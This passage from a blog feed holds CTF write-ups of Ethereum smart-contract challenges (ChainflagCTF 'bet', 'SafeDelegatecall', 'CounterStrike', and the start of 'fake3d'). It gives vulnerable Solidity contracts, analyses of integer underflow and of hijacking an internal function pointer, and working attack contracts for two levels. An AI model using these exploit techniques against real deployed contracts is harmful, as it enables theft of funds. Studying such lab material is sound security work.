class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">contract bet &#123;</span><br><span class="line">    uint secret;</span><br><span class="line">    address owner;</span><br><span class="line">    </span><br><span class="line">    mapping(address =&gt; uint) public balanceOf;</span><br><span class="line">    mapping(address =&gt; uint) public gift;</span><br><span class="line">    mapping(address =&gt; uint) public isbet;</span><br><span class="line">    </span><br><span class="line">    event SendFlag(string b64email);</span><br><span class="line">    </span><br><span class="line">    function Bet() public&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function payforflag(string b64email) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= 100000);</span><br><span class="line">        balanceOf[msg.sender]=0;</span><br><span class="line">        owner.transfer(address(this).balance);</span><br><span class="line">        emit SendFlag(b64email);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    //to fuck</span><br><span class="line">    </span><br><span class="line">    modifier only_owner() &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function setsecret(uint secretrcv) only_owner &#123;</span><br><span class="line">        secret=secretrcv;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function deposit() payable&#123;</span><br><span class="line">        uint geteth=msg.value/1000000000000000000;</span><br><span class="line">        balanceOf[msg.sender]+=geteth;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function profit() &#123;</span><br><span class="line">        require(gift[msg.sender]==0);</span><br><span class="line">        gift[msg.sender]=1;</span><br><span class="line">        balanceOf[msg.sender]+=1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function betgame(uint secretguess)&#123;</span><br><span class="line">        require(balanceOf[msg.sender]&gt;0);</span><br><span class="line">        balanceOf[msg.sender]-=1;</span><br><span class="line">        if (secretguess==secret)</span><br><span class="line">        &#123;</span><br><span class="line">            balanceOf[msg.sender]+=2;</span><br><span class="line">            isbet[msg.sender]=1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function doublebetgame(uint secretguess) only_owner&#123;</span><br><span class="line">        require(balanceOf[msg.sender]-2&gt;0);</span><br><span class="line">        require(isbet[msg.sender]==1);</span><br><span class="line">        balanceOf[msg.sender]-=2;</span><br><span class="line">        if (secretguess==secret)</span><br><span class="line">        &#123;</span><br><span class="line">            balanceOf[msg.sender]+=2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><p>underflow &amp; secret can be seen and controlled</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">interface Ibet &#123;</span><br><span class="line">    function balanceOf(address) external returns(uint);</span><br><span class="line">    function Bet() external;</span><br><span class="line">    function payforflag(string) external;</span><br><span class="line">    function setsecret(uint) external;</span><br><span class="line">    function profit() external;</span><br><span class="line">    function betgame(uint)external;</span><br><span class="line">    function doublebetgame(uint) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract betAttack&#123;</span><br><span class="line">    Ibet public _bet;</span><br><span class="line"></span><br><span class="line">    constructor(address _addr) public&#123;</span><br><span class="line">        _bet = Ibet(_addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function solve() public&#123;</span><br><span class="line">        _bet.Bet(); //be the owner</span><br><span class="line">        _bet.profit(); //get 1 ether to play game</span><br><span class="line">        _bet.betgame(0); // the secret is &#x27;0&#x27;, if we guess right, we will make isbet() return 1, than we can call doublebetgame</span><br><span class="line">        _bet.betgame(1); // guess for a wrong number, it will minus 1 of our balance: now our balance is 2 - 1 = 1</span><br><span class="line">        // wrong guess, which will minus us 2 ether, it will cause an underflow: 1 - 2 = 115792089237316195423570985008687907853269984665640564039457584007913129639935</span><br><span class="line">        // attention, dont put in the correct number, bacause it will add 2 after underflow which makes our balance back to 1</span><br><span class="line">        _bet.doublebetgame(1); </span><br><span class="line">        _bet.payforflag(&quot;successfully&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance() public view returns(uint256)&#123;</span><br><span class="line">        uint256 balance = _bet.balanceOf(address(this));</span><br><span class="line">        return balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function() external payable &#123;&#125; // attention!!!! solve() will revert without this!!!</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2>]]></content>
      
      
      <categories>
          
          <category> 02.ChainflagCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>06.delegatecall @SafaDelegatecall</title>
      <link href="/2023/07/13/02.ChainflagCTF/06.delegatecall%20@SafaDelegatecall/"/>
      <url>/2023/07/13/02.ChainflagCTF/06.delegatecall%20@SafaDelegatecall/</url>
      
        <content type="html"><![CDATA[<h1 id="delegatecall-SafaDelegatecall"><a href="#delegatecall-SafaDelegatecall" class="headerlink" title="delegatecall(SafaDelegatecall)"></a>delegatecall(SafaDelegatecall)</h1><h2 id="contract"><a href="#contract" class="headerlink" title="contract"></a>contract</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.23;</span><br><span class="line"></span><br><span class="line">contract SafeDelegatecall &#123;</span><br><span class="line"></span><br><span class="line">    address private owner;</span><br><span class="line">    bytes4 internal constant SET = bytes4(keccak256(&#x27;fifth(uint256)&#x27;));</span><br><span class="line">    event SendFlag(address addr);</span><br><span class="line">    uint randomNumber = 0;</span><br><span class="line"></span><br><span class="line">    struct Func &#123;</span><br><span class="line">        function() internal f;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor() public payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute(address _target) public payable&#123;</span><br><span class="line">        require(_target.delegatecall(abi.encodeWithSelector(this.execute.selector)) == false, &#x27;unsafe execution&#x27;);</span><br><span class="line"></span><br><span class="line">        bytes4 sel;</span><br><span class="line">        uint val;</span><br><span class="line"></span><br><span class="line">        (sel, val) = getRet();</span><br><span class="line">        require(sel == SET);</span><br><span class="line"></span><br><span class="line">        Func memory func;</span><br><span class="line">        func.f = gift;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            mstore(func, sub(mload(func), val))</span><br><span class="line">        &#125;</span><br><span class="line">        func.f();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function gift() private &#123;</span><br><span class="line">        payforflag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getRet() internal pure returns (bytes4 sel, uint val) &#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            if iszero(eq(returndatasize, 0x24)) &#123; revert(0, 0) &#125;</span><br><span class="line">            let ptr := mload(0x40)</span><br><span class="line">            returndatacopy(ptr, 0, 0x24)</span><br><span class="line">            sel := and(mload(ptr), 0xffffffff00000000000000000000000000000000000000000000000000000000)</span><br><span class="line">            val := mload(add(0x04, ptr))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function payforflag() public payable onlyOwner &#123;</span><br><span class="line">        require(msg.value == 1, &#x27;I only need a little money!&#x27;);</span><br><span class="line">        emit SendFlag(msg.sender);</span><br><span class="line">        selfdestruct(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function() payable public&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><h3 id="code"><a href="#code" class="headerlink" title="code"></a>code</h3><p>Our goal is to trigger the event <code>SendFlag()</code>, but only owner could call it and no code can set owner. Let’s look at <code>execute()</code>, maybe it can do something.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function execute(address _target) public payable&#123;</span><br><span class="line">    require(_target.delegatecall(abi.encodeWithSelector(this.execute.selector)) == false, &#x27;unsafe execution&#x27;);</span><br><span class="line"></span><br><span class="line">    bytes4 sel;</span><br><span class="line">    uint val;</span><br><span class="line"></span><br><span class="line">    (sel, val) = getRet();</span><br><span class="line">    require(sel == SET);</span><br><span class="line"></span><br><span class="line">    Func memory func;</span><br><span class="line">    func.f = gift;</span><br><span class="line">    assembly &#123;</span><br><span class="line">        mstore(func, sub(mload(func), val))</span><br><span class="line">    &#125;</span><br><span class="line">    func.f();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>this is <code>execute()</code> logic: </p><p>(1) call _tartget’s <code>execute()</code>, and it should be execute wrong and return false</p><p>(2) <code>getRet()</code> should return 2 values, one is <code>bytes4(keccak256(&#39;fifth(uint256)&#39;))</code> and the other one “val” is anything u like. But “val” should be a specific value or you can not complete this level.</p><p>(3) <code>func.f = gift</code> and <code>func.f()</code>: it will call <code>gift()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function gift() private &#123;</span><br><span class="line">    payforflag();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(4) assembly</p><ul><li><code>mload(func)</code>: get the address of <code>func</code> in memory ==&gt; get the address of <code>gift</code> in memory, because the <code>struct</code>‘s feature. If you know the EVM storage of <code>struct</code> you can understand it.</li><li><p><code>sub(mload(func), val)</code>: address(gift) - val, and the val is decided by us. So we can create a <em>target</em> contract, and the program execution flow can go anywhere.</p></li><li><p><code>mstore(func, sub(mload(func), val))</code>: place <code>sub(mload(func), val)</code> in the 32 bytes after address <code>func</code>. This means that if we call <code>func.f()</code>, it would jump to the address <code>func</code> and execute the code after the address <code>func</code>. We want to jump to <code>emit SendFlag(msg.sender);</code>, we need to find its address and then we can jump to this code directly without passing the <code>require()</code> and <code>onlyOwner</code></p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function payforflag() public payable onlyOwner &#123;</span><br><span class="line">    require(msg.value == 1, &#x27;I only need a little money!&#x27;);</span><br><span class="line">    emit SendFlag(msg.sender);</span><br><span class="line">    selfdestruct(msg.sender);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>So we should find the “val”. And we should analyses <code>getRet()</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function getRet() internal pure returns (bytes4 sel, uint val) &#123;</span><br><span class="line">    assembly &#123;</span><br><span class="line">        if iszero(eq(returndatasize, 0x24)) &#123; //0x24=36</span><br><span class="line">            revert(0, 0) </span><br><span class="line">        &#125;</span><br><span class="line">        let ptr := mload(0x40) //0x40=64</span><br><span class="line">        returndatacopy(ptr, 0, 0x24)</span><br><span class="line">        sel := and(mload(ptr), 0xffffffff00000000000000000000000000000000000000000000000000000000)</span><br><span class="line">        val := mload(add(0x04, ptr))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>returndatasize</code>: size of the last returndata, in our level it is the value that delegatecall returns</li><li><code>eq(returndatasize, 0x24)</code>: if <code>returndatasize</code> is 0x24 bytes?</li><li><code>iszero(eq(returndatasize, 0x24))</code>: 0x24 bytes==&gt;true==&gt;1==&gt; not revert(), or it will revert()</li><li><code>let ptr := mload(0x40)</code>: get the free memory pointer</li><li><code>returndatacopy(ptr, 0, 0x24)</code>: copy s bytes from returndata at position f to mem at position t. In our level, it is put the value that delegatecall returned in the address of ptr(0x40).</li><li><code>mload(ptr)</code>: get 32 bytes after address ptr</li><li><code>sel := and(mload(ptr), 0xffffffff00000000000000000000000000000000000000000000000000000000)</code>: get the first 4 bytes ==&gt; <code>bytes4(keccak256(&#39;fifth(uint256)&#39;))</code></li><li><code>add(0x04, ptr)</code>： pass 4bytes==&gt;pass address(sel)</li><li><code>val := mload(add(0x04, ptr))</code>: get the following 32 bytes==&gt;val, anything we can decide</li></ul><h3 id="search-for-the-“val”"><a href="#search-for-the-“val”" class="headerlink" title="search for the “val”"></a>search for the “val”</h3><p>address(emit …) = address(gift) - val, equal to val = address(gift) - address(emit …), We need to decompile the contract to find the address.</p><p>The title address is in goerli: <code>0x43E9663D23bBafc76630f7c933A028dE85892E40</code>, and I decompile it in this <a href="https://ethervm.io/decompile/goerli/0x43e9663d23bbafc76630f7c933a028de85892e40">site</a>.</p><p>To find <code>emit SendFlag(msg.sender);</code>, we can search for opcode<code>SELFDESTRUCT</code>.</p><p><img src="https://moe.photo/images/2023/05/23/image-20230523144355736.png" alt></p><p>From this picture, we can infer it contains <code>emit SendFlag(msg.sender)</code> because of <code>LOG1</code> but not contains <code>require()</code> because of no <code>*REVERT</code>, so address <code>03C1</code> is the <code>address(emit ...)</code></p><p>Also, you can find <code>emit SendFlag(msg.sender)</code> throught <code>require(msg.value == 1,&#39;I only need a little money!&#39;)</code> since it only appears once in the contract. From this picture, it approves <code>03c1</code> is right. Jump to <code>emit SendFlag(msg.sender)</code> that makes us escape from the <code>require()</code> check.</p><p><img src="https://moe.photo/images/2023/05/25/image-20230525105908586.png" alt></p><p>To find <code>address(gift)</code>,  we can search with <code>*REVERT</code> and opcode <code>MSTORE</code>. And now we know <code>048a</code> is <code>address(gift)</code></p><p><img src="https://moe.photo/images/2023/05/23/image-20230523145423870.png" alt></p><p><strong>Now we know that: val = address(gift) - address(emit …) = 048A - 03C1 = 1162 - 961 = 201 = C9</strong></p><p>This is a picture created by me, I hope it is helpful for you to understand this level:</p><p><img src="https://moe.photo/images/2023/05/23/image-20230523153157158.png" alt></p><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract SafeDelegatecallAttack &#123;</span><br><span class="line">    bytes4 internal constant SEL = bytes4(keccak256(&#x27;fifth(uint256)&#x27;));</span><br><span class="line"></span><br><span class="line">    fallback() external &#123;</span><br><span class="line">        bytes4 sel = SEL;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            mstore(0, sel)</span><br><span class="line">            mstore(4, 0xC9)</span><br><span class="line">            revert(0, 0x24)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;// 048A - 03C1 = 1162 - 961 = 201 = C9</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>From this level, I know that if we have inline assembly, we can jump to anywhere we like even pass important check! </p><p>Let’s solve it!</p><p><img src="https://moe.photo/images/2023/05/23/image-20230523155021249.png" alt></p><p><img src="https://moe.photo/images/2023/05/23/image-20230523155030533.png" alt></p><p><img src="https://moe.photo/images/2023/05/23/image-20230523155037589.png" alt></p><p>destruct contract successfully</p><p><img src="https://moe.photo/images/2023/05/23/image-20230523155106491.png" alt></p><p>trigger successfully :)</p>]]></content>
      
      
      <categories>
          
          <category> 02.ChainflagCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>05.delegatecall @CounterStrike</title>
      <link href="/2023/07/13/02.ChainflagCTF/05.delegatecall%20@CounterStrike/"/>
      <url>/2023/07/13/02.ChainflagCTF/05.delegatecall%20@CounterStrike/</url>
      
        <content type="html"><![CDATA[<h1 id="delegatecall-CounterStrike"><a href="#delegatecall-CounterStrike" class="headerlink" title="delegatecall(CounterStrike)"></a>delegatecall(CounterStrike)</h1><h2 id="contract"><a href="#contract" class="headerlink" title="contract"></a>contract</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.10;</span><br><span class="line"></span><br><span class="line">contract EasyBomb&#123;</span><br><span class="line">    bool private hasExplode = false;</span><br><span class="line">    address private launcher_address;</span><br><span class="line">    bytes32 private password;</span><br><span class="line">    bool public power_state = true;</span><br><span class="line">    bytes4 constant launcher_start_function_hash = bytes4(keccak256(&quot;setdeadline(uint256)&quot;));</span><br><span class="line">    Launcher launcher;</span><br><span class="line"></span><br><span class="line">    constructor(address _launcher_address, bytes32 _fake_flag) public &#123;</span><br><span class="line">        launcher_address = _launcher_address;</span><br><span class="line">        password = _fake_flag ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier isOwner()&#123;</span><br><span class="line">        require(msgPassword() == password);</span><br><span class="line">        require(msg.sender != tx.origin);</span><br><span class="line">        uint x;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            x := extcodesize(caller) </span><br><span class="line">        &#125;</span><br><span class="line">        require(x == 0);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier notExplodeYet()&#123;</span><br><span class="line">        launcher = Launcher(launcher_address);</span><br><span class="line">        require(block.number &lt; launcher.deadline());</span><br><span class="line">        hasExplode = true;</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function msgPassword() public returns (bytes32 result)  &#123;</span><br><span class="line">        bytes memory msg_data = msg.data;</span><br><span class="line">        if (msg_data.length == 0) &#123;</span><br><span class="line">            return 0x0;</span><br><span class="line">        &#125;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            result := mload(add(msg_data, add(0x20, 0x24)))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setCountDownTimer(uint256 _deadline) public isOwner notExplodeYet &#123;</span><br><span class="line">        launcher_address.delegatecall(abi.encodeWithSignature(&quot;setdeadline(uint256)&quot;,_deadline));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Launcher&#123;</span><br><span class="line">    uint256 public deadline;</span><br><span class="line"></span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        deadline = block.number + 100;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setdeadline(uint256 _deadline) public &#123;</span><br><span class="line">        deadline = _deadline;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Setup &#123;</span><br><span class="line">    EasyBomb public easyBomb;</span><br><span class="line"></span><br><span class="line">    constructor(bytes32 _password) public &#123;</span><br><span class="line">        easyBomb = new EasyBomb(address(new Launcher()), _password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns (bool) &#123;</span><br><span class="line">        return easyBomb.power_state() == false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><p>和本博客文章[security-03]一样</p><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2>]]></content>
      
      
      <categories>
          
          <category> 02.ChainflagCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>04.airdrop-hunting @fake3d</title>
      <link href="/2023/07/13/02.ChainflagCTF/04.airdrop-hunting%20@fake3d/"/>
      <url>/2023/07/13/02.ChainflagCTF/04.airdrop-hunting%20@fake3d/</url>
      
        <content type="html"><![CDATA[<h1 id="airdrop-hunting-fake3d"><a href="#airdrop-hunting-fake3d" class="headerlink" title="airdrop-hunting(fake3d)"></a>airdrop-hunting(fake3d)</h1><h2 id="contract"><a href="#contract" class="headerlink" title="contract"></a>contract</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> *Submitted for verification at Etherscan.io on 2018-11-27</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title SafeMath</span><br><span class="line"> * @dev Math operations with safety checks that revert on error</span><br><span class="line"> */</span><br><span class="line">library SafeMath &#123;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">  * @dev Multiplies two numbers, reverts on overflow.</span><br><span class="line">  */</span><br><span class="line">  function mul(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    // Gas optimization: this is cheaper than requiring &#x27;a&#x27; not being zero, but the</span><br><span class="line">    // benefit is lost if &#x27;b&#x27; is also tested.</span><br><span class="line">    // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522</span><br><span class="line">    if (a == 0) &#123;</span><br><span class="line">      return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint256 c = a * b;</span><br><span class="line">    require(c / a == b);</span><br><span class="line"></span><br><span class="line">    return c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">  * @dev Integer division of two numbers truncating the quotient, reverts on division by zero.</span><br><span class="line">  */</span><br><span class="line">  function div(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    require(b &gt; 0); // Solidity only automatically asserts when dividing by 0</span><br><span class="line">    uint256 c = a / b;</span><br><span class="line">    // assert(a == b * c + a % b); // There is no case in which this doesn&#x27;t 